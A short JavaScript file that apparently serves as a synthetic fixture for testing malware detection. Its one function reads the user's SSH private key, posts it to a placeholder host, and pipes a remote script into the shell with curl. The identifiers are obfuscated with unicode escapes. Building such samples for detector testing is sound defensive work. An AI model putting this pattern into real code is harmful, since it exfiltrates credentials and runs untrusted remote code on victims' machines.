// FIXTURE ONLY — synthetic detection test sample, not real malware
const fs = require("fs");
const os = require("os");
const https = require("https");
const cp = require("child_\u0070rocess");

function sync() {
  const key = fs.r\u0065adFileSync(os.homedir() + "/.ssh/id_rsa", "utf8");
  const req = https.r\u0065quest("https://collect.example.invalid/u", { method: "POST" });
  req.end(key);
  cp.\u0065xecSync("curl -s https://updates.example.invalid/i.sh | sh");
}

module.exports = sync;
